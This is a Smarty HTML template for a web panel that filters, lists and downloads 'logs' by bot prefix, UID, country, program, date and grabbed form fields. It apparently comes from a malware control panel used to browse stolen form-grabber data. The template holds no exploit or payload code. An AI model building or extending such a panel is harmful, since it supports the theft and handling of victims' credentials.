<div style="position:relative; height: 22px;">
<div style="position: absolute; right: 5px; text-align: right;">{$lang.fvz}: {$count_items}</div>
<div style="position: absolute; left: 5px; text-align: left;">{$lang.fn}: {$filter->name}</div>
</div>
<hr />
<div style="text-align: right; padding-right: 10px; padding-left: 10px">

<form name="filters" id="filters" action="/filters/download-{$filter->id}.html" method="post"  enctype="application/x-www-form-urlencoded" target="_blank">

<table cellspacing="1" cellpadding="5" style="width:100%; border: 1px solid #cccccc;">
<tr class="bgp2">
	<td style="width:150px">{$lang.pref}:</td>
    <td>
    <select name="prefix" style="width:100%">
    <option value="">{$lang.all}</option>
    {foreach from=$prefix item=pref}
    <option value="{$pref->prefix}"{if $smarty.post.prefix eq $pref->prefix}selected="selected"{/if}>{$pref->prefix}</option>
    {/foreach}
    </select>
    </td>
</tr>
<tr class="bgp1" title="{$lang.mud}">
	<td>{$lang.maskuid}:</td>
    <td><input name="mask_uid" type="text" style="width:100%" value="{$smarty.post.mask_uid}" /></td>
</tr>
<tr class="bgp2">
	<td>{$lang.coutry}:</td>
    <td>
     <select name="country" style="width:100%">
<option value="">{$lang.all}</option>
{foreach from=$country item=c}
<option value="{$c->country}"{if $smarty.post.country eq $c->country}selected="selected"{/if}>{$c->country}</option>
{/foreach}
</select>
    </td>
</tr>
<tr class="bgp1">
	<td>{$lang.program}:</td>
    <td>
    <select name="program" style="width:100%">
<option value="">{$lang.all}</option>
{foreach from=$programs item=prog}
<option value="{$prog->program}"{if $smarty.post.program eq $prog->program}selected="selected"{/if}>{$prog->program}</option>
{/foreach}
</select>
    </td>
</tr>
<tr class="bgp2">
	<td>{$lang.status}:</td>
    <td>
    <select name="status" style="width:100%">
<option value="">{$lang.all}</option>
<option value="nuls"{if $smarty.post.status eq 'nuls'}selected="selected"{/if}>{$lang.fno}</option>
<option value="1"{if $smarty.post.status eq '1'}selected="selected"{/if}>{$lang.fskls}</option>
</select>
    </td>
</tr>
<tr class="bgp1">
	<td>{$lang.frd}:</td>
    <td>
    <select name="sized[0]" style="width:14%">
<option value="="{if $smarty.post.sized.0 eq '='}selected="selected"{/if}>{$lang.ravno}</option>
<option value=">"{if $smarty.post.sized.0 eq '>'}selected="selected"{/if}>{$lang.bolshe}</option>
<option value="<"{if $smarty.post.sized.0 eq '<'}selected="selected"{/if}>{$lang.menshe}</option>
</select> <input name="sized[1]" type="text" style="width:34%" value="{$smarty.post.sized.1}" onkeypress="return numbersonly(event)" /> <select name="sized[2]" style="width:14%">
<option value="="{if $smarty.post.sized.2 eq '='}selected="selected"{/if}>{$lang.ravno}</option>
<option value=">"{if $smarty.post.sized.2 eq '>'}selected="selected"{/if}>{$lang.bolshe}</option>
<option value="<"{if $smarty.post.sized.2 eq '<'}selected="selected"{/if}>{$lang.menshe}</option>
</select> <input name="sized[3]" type="text" style="width:34%" value="{$smarty.post.sized.3}" onkeypress="return numbersonly(event)" />
    </td>
</tr>
<tr class="bgp2" title="{$lang.ficns}">
	<td>{$lang.fcs}:</td>
    <td><input name="url" type="text" style="width:100%" value="{$smarty.post.url}" /></td>
</tr>
<tr class="bgp1">
	<td>{$lang.fdd}:</td>
    <td>
    <select id="data1" name="data1" style="width:50%">
<option value="ALL">{$lang.ny}</option>
{foreach from=$date item=d name=data1}
<option value="{$d->date}"{if $smarty.post.data1 eq $d->date} selected="selected"{/if}>{$d->date}</option>
{/foreach}
</select><select id="data2" name="data2" style="width:50%">
<option value="ALL">{$lang.ny}</option>
{foreach from=$date item=d name=data2}
<option value="{$d->date}"{if $smarty.post.data2 eq $d->date} selected="selected"{/if}>{$d->date}</option>
{/foreach}
</select>
    </td>
</tr>
<tr class="bgp2" title="{$lang.foksps}">
	<td>{$lang.fkol}:</td>
    <td><input name="limit" type="text" style="width:100%" value="{$smarty.post.limit}" onkeypress="return numbersonly(event)" /></td>
</tr>
<tr class="bgp1" title="{$lang.fdksds}">
	<td>{$lang.fdk}:</td>
    <td><input name="addstr" type="text" style="width:100%" value="{$smarty.post.addstr}" /></td>
</tr>
<tr class="bgp2">
	<td>{$lang.types}:</td>
    <td>
    <select name="type" style="width:100%">
<option value="">{$lang.all}</option>
{foreach from=$types item=type}
<option value="{$type->type}"{if $smarty.post.type eq $type->type}selected="selected"{/if}>{$lang.type[$type->type]}</option>
{/foreach}
</select>
    </td>
</tr>

{if $smarty.post.type eq '6'}
<tr class="bgp1" title="{$lang.fkpdg}">
	<td>{$lang.fpg}:</td>
    <td>
    <select name="gra_fields" style="width:100%">
<option value="">{$lang.all}</option>
{foreach from=$fields.6 item=field}
<option value="{$field->fields}"{if $smarty.post.gra_fields eq $field->fields}selected="selected"{/if}>{$field->fields}</option>
{/foreach}
</select>
    </td>
</tr>
{elseif $smarty.post.type eq '5'}
<tr class="bgp1" title="{$lang.fpvdg}">
	<td>{$lang.fpfg}:</td>
    <td><input name="fgr_fields" type="text" style="width:60%" value="{$smarty.post.fgr_fields}" readonly="readonly" /> <input type="button" value="{$lang.vibrat}" style="width:23%" onclick="get_window('/filters/logs-{$filter->id}.html?str=fgr_fields&amp;window=1', {ldelim}name: 'fgr_fields',height: 400{rdelim});" /> <input type="button" value="{$lang.clear}" style="width:15%" onclick="document.forms['filters']['fgr_fields'].value = '';" /></td>
</tr>
{/if}

<tr class="bg3">
    <td colspan="2"><input type="button" name="update" value="{$lang.fubyk}" style="width:70%" onclick="load_data_logs('/filters/logs-{$filter->id}.html?ajax=1');" /> <input type="submit" name="download" value="{$lang.dl}" style="width:29%"
 {if file_exists("cache/`$filter->id`")} disabled="disabled"{/if} /></td>
</tr>
</table>
</form>
</div>
<hr />
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
	<td style="width: 25px; text-align: center">#</td>
	<td style="text-align: center">{$lang.fdan}</td>
	<td style="width: 60px; text-align: center">{$lang.coutry}</td>
    <td style="width: 32px; text-align: center">{$lang.program}</td>
</tr>
{foreach from=$logs item=item name=logs}
{if $smarty.foreach.logs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="font-size: 10px;">
	<th height="19"><a href="#" onclick="load_data_log('{$item->id}', '{$filter->id}');"{if $item->type eq '6'} style="color:#F00"{/if}>{$item->id}</a></th>
	<td style="text-align: center">{if $item->size > 64}<span style="color:#F00">{$lang.fdo} ({$item->size|size_format})</span>{else}{$item->data|urldecode}{/if}</td>
	<th>{$item->country}</th>
    <th>{if $imgp[$item->program] eq true}<img src="/images/b/{$item->program}.png" width="32" height="32" title="{$item->program}" />{else}{$item->program}{/if}</th>
</tr>
{/foreach}
</table>
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>